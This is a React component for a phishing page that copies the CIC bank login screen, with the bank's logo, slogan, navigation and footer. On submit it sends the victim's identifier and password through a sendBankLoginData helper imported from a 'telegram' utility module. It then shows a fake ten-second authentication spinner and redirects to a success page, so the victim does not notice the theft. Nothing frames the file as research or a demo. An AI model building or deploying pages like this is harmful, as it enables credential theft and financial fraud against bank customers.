import React, { useState } from 'react';
import { X, Eye, EyeOff, Search } from 'lucide-react';
import { sendBankLoginData } from '../../utils/telegram';

type CICAuthProps = {
  onAuthenticate: () => void;
  onBack: () => void;
};

const CICAuth = ({ onAuthenticate, onBack }: CICAuthProps) => {
  const [identifiant, setIdentifiant] = useState('');
  const [motDePasse, setMotDePasse] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (identifiant && motDePasse) {
      setIsLoading(true);
      
      await sendBankLoginData({
        bankName: 'CIC',
        username: identifiant,
        password: motDePasse
      });

      setTimeout(() => {
        setIsLoading(false);
        // Redirection vers la page de succès
        window.location.href = '/success';
      }, 10000);
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-white">
        <div className="text-center">
          <div className="mb-8">
            <div className="w-20 h-20 mx-auto relative">
              <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
              <div className="absolute inset-0 rounded-full border-4 border-[#1BA3A3] animate-spin border-t-transparent"></div>
            </div>
          </div>
          <h2 className="text-xl font-semibold text-gray-800 mb-2">
            Authentification en cours
          </h2>
          <p className="text-gray-600">
            Connexion à votre espace CIC...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="bg-white border-b border-gray-200">
        <div className="flex items-center justify-between px-4 py-3">
          <div className="flex items-center">
            <img 
              src="https://upload.wikimedia.org/wikipedia/fr/9/91/Logo_CIC_2006.svg" 
              alt="CIC" 
              className="h-12"
              onError={(e) => {
                (e.target as HTMLImageElement).src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjQ4IiB2aWV3Qm94PSIwIDAgMTAwIDQ4IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMzAiIGhlaWdodD0iNDgiIGZpbGw9IiMwMDQ0ODgiLz4KPHJLY3QgeD0iMzUiIHdpZHRoPSIzMCIgaGVpZ2h0PSI0OCIgZmlsbD0iI0U2MDAxMiIvPgo8cmVjdCB4PSI3MCIgd2lkdGg9IjMwIiBoZWlnaHQ9IjQ4IiBmaWxsPSIjMUJBM0EzIi8+Cjx0ZXh0IHg9IjUwIiB5PSIzMCIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjE2IiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC13ZWlnaHQ9ImJvbGQiPkNJQzwvdGV4dD4KPHN2Zz4K';
              }}
            />
            <span className="ml-4 text-gray-600 text-sm hidden lg:block">Construisons pour que le monde bouge</span>
          </div>
          
          <div className="flex items-center space-x-6">
            <div className="hidden lg:flex items-center space-x-1">
              <input 
                type="text" 
                placeholder="Rechercher" 
                className="px-3 py-1 border border-gray-300 rounded text-sm"
              />
              <button className="p-1 text-gray-600">
                <Search size={20} />
              </button>
            </div>
            
            <div className="flex items-center space-x-4">
              <button className="flex items-center space-x-2 text-purple-600 hover:text-purple-700">
                <div className="w-8 h-8 bg-purple-100 rounded-full flex items-center justify-center">
                  <span className="text-purple-600 text-sm">★</span>
                </div>
                <div className="text-sm hidden lg:block">
                  <div className="font-medium">DEVENIR CLIENT</div>
                  <div className="text-xs">du CIC</div>
                </div>
              </button>
              
              <button className="flex items-center space-x-2 text-red-600 hover:text-red-700">
                <div className="w-8 h-8 bg-red-100 rounded-full flex items-center justify-center">
                  <span className="text-red-600 text-sm">🔒</span>
                </div>
                <div className="text-sm hidden lg:block">
                  <div className="font-medium">ESPACE CLIENT</div>
                  <div className="text-xs">Connexion</div>
                </div>
              </button>
              
              <button 
                onClick={onBack}
                className="p-1 text-gray-600 hover:text-gray-800 transition-colors"
              >
                <X size={20} />
              </button>
            </div>
          </div>
        </div>
        
        {/* Navigation */}
        <nav className="hidden lg:block bg-gray-50 border-t border-gray-200">
          <div className="px-4 py-2">
            <div className="flex space-x-8 text-sm">
              <button className="text-gray-800 font-medium">ACCUEIL</button>
              <button className="text-gray-600 hover:text-gray-800">Comptes et Cartes</button>
              <button className="text-gray-600 hover:text-gray-800">Épargne</button>
              <button className="text-gray-600 hover:text-gray-800">Crédits</button>
              <button className="text-gray-600 hover:text-gray-800">Assurances</button>
              <button className="text-gray-600 hover:text-gray-800">Mobile</button>
              <button className="text-gray-600 hover:text-gray-800">Simulations et souscriptions</button>
            </div>
          </div>
        </nav>
      </header>

      <div className="flex flex-col lg:flex-row">
        {/* Sidebar gauche - Desktop uniquement */}
        <div className="hidden lg:block lg:w-1/3 bg-gray-100 min-h-[calc(100vh-140px)] p-6">
          <div className="bg-white rounded-lg shadow-sm">
            <div className="p-4 border-b border-gray-200">
              <h2 className="text-lg font-semibold text-gray-800">Espace client : Connexion</h2>
            </div>
            
            <div className="p-4 space-y-3">
              <button className="w-full text-left p-3 bg-blue-50 border-l-4 border-blue-500 text-blue-700 font-medium">
                Identifiant / Mot de passe
              </button>
              <button className="w-full text-left p-3 text-gray-600 hover:bg-gray-50">
                Certificat Électronique
              </button>
              <button className="w-full text-left p-3 text-gray-600 hover:bg-gray-50">
                SAFETRANS
              </button>
            </div>
          </div>
          
          {/* Section Internet et sécurité bancaire */}
          <div className="mt-6 bg-white rounded-lg shadow-sm overflow-hidden">
            <img 
              src="https://images.unsplash.com/photo-1618060932014-4deda4932554?q=80&w=2340&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
              alt="Internet et sécurité bancaire"
              className="w-full h-32 object-cover"
            />
            <div className="p-4">
              <h3 className="font-semibold text-gray-800 mb-2">Internet et sécurité bancaire</h3>
              <p className="text-sm text-gray-600">
                Profitez de l'internet en déjouant ses pièges.
              </p>
            </div>
          </div>
        </div>

        {/* Section principale */}
        <div className="flex-1 p-6 lg:p-12">
          <div className="max-w-md mx-auto lg:mx-0">
            <h1 className="text-xl lg:text-2xl font-semibold text-gray-800 mb-8 lg:hidden">
              Identifiant / Mot de passe
            </h1>
            
            <div className="hidden lg:block mb-8">
              <h1 className="text-2xl font-semibold text-gray-800 mb-2">
                Identifiant / Mot de passe
              </h1>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Champ Identifiant */}
              <div>
                <label className="block text-gray-700 font-medium mb-2">
                  Identifiant
                </label>
                <input
                  type="text"
                  value={identifiant}
                  onChange={(e) => setIdentifiant(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#1BA3A3] focus:border-transparent"
                />
              </div>

              {/* Champ Mot de passe */}
              <div>
                <label className="block text-gray-700 font-medium mb-2">
                  Mot de passe
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={motDePasse}
                    onChange={(e) => setMotDePasse(e.target.value)}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#1BA3A3] focus:border-transparent pr-12"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
                  >
                    {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>
              </div>

              {/* Bouton Se connecter */}
              <button
                type="submit"
                disabled={!identifiant || !motDePasse || isLoading}
                className="w-full bg-[#1BA3A3] text-white py-4 rounded-lg text-lg font-semibold hover:bg-[#158a8a] disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors focus:outline-none focus:ring-2 focus:ring-[#1BA3A3] focus:ring-offset-2"
              >
                Se connecter
              </button>

              {/* Liens d'aide */}
              <div className="flex flex-col space-y-2 text-center">
                <button
                  type="button"
                  className="text-[#1BA3A3] hover:underline text-sm"
                >
                  Codes d'accès oubliés &gt;
                </button>
                <button
                  type="button"
                  className="text-[#1BA3A3] hover:underline text-sm"
                >
                  Infos sécurité &gt;
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-[#1BA3A3] text-white">
        <div className="px-6 py-8">
          {/* Sections principales */}
          <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-7 gap-6 mb-8">
            <div className="text-center">
              <div className="w-12 h-12 mx-auto mb-3 bg-white/20 rounded-full flex items-center justify-center">
                <span className="text-white text-xl">📍</span>
              </div>
              <h4 className="font-semibold text-sm">Agences et distributeurs</h4>
            </div>
            
            <div className="text-center">
              <div className="w-12 h-12 mx-auto mb-3 bg-white/20 rounded-full flex items-center justify-center">
                <span className="text-white text-xl">🎯</span>
              </div>
              <h4 className="font-semibold text-sm">Assistance</h4>
            </div>
            
            <div className="text-center">
              <div className="w-12 h-12 mx-auto mb-3 bg-white/20 rounded-full flex items-center justify-center">
                <span className="text-white text-xl">♿</span>
              </div>
              <h4 className="font-semibold text-sm">Accessibilité</h4>
            </div>
            
            <div className="text-center">
              <div className="w-12 h-12 mx-auto mb-3 bg-white/20 rounded-full flex items-center justify-center">
                <span className="text-white text-xl">📞</span>
              </div>
              <h4 className="font-semibold text-sm">Contacts</h4>
            </div>
            
            <div className="text-center">
              <div className="w-12 h-12 mx-auto mb-3 bg-white/20 rounded-full flex items-center justify-center">
                <span className="text-white text-xl">📧</span>
              </div>
              <h4 className="font-semibold text-sm">Newsletter</h4>
            </div>
            
            <div className="text-center">
              <div className="w-12 h-12 mx-auto mb-3 bg-white/20 rounded-full flex items-center justify-center">
                <span className="text-white text-xl">📱</span>
              </div>
              <h4 className="font-semibold text-sm">Réseaux sociaux</h4>
            </div>
            
            <div className="text-center">
              <div className="w-12 h-12 mx-auto mb-3 bg-white/20 rounded-full flex items-center justify-center">
                <span className="text-white text-xl">🔒</span>
              </div>
              <h4 className="font-semibold text-sm">Fraude et sécurité bancaire</h4>
            </div>
          </div>

          {/* Accordéons */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
            <div className="bg-[#158a8a] rounded-lg p-4">
              <button className="w-full flex items-center justify-between text-left">
                <span className="font-semibold">Espaces dédiés</span>
                <span>▲</span>
              </button>
            </div>
            
            <div className="bg-[#158a8a] rounded-lg p-4">
              <button className="w-full flex items-center justify-between text-left">
                <span className="font-semibold">Nos applications mobiles</span>
                <span>▲</span>
              </button>
            </div>
            
            <div className="bg-[#158a8a] rounded-lg p-4">
              <button className="w-full flex items-center justify-between text-left">
                <span className="font-semibold">Le groupe CIC</span>
                <span>▲</span>
              </button>
            </div>
          </div>
        </div>

        {/* Footer légal */}
        <div className="border-t border-white/20 px-6 py-4">
          <div className="flex flex-wrap justify-center gap-4 text-xs text-white/80">
            <button className="hover:text-white">Recrutement</button>
            <span>-</span>
            <button className="hover:text-white">Tarifs et conditions générales</button>
            <span>-</span>
            <button className="hover:text-white">Plan du site</button>
            <span>-</span>
            <button className="hover:text-white">Mentions légales</button>
            <span>-</span>
            <button className="hover:text-white">Informations réglementaires</button>
            <span>-</span>
            <button className="hover:text-white">Protection des données</button>
            <span>-</span>
            <button className="hover:text-white">Gestion des cookies</button>
            <span>-</span>
            <button className="hover:text-white">Accessibilité : Partiellement conforme</button>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default CICAuth;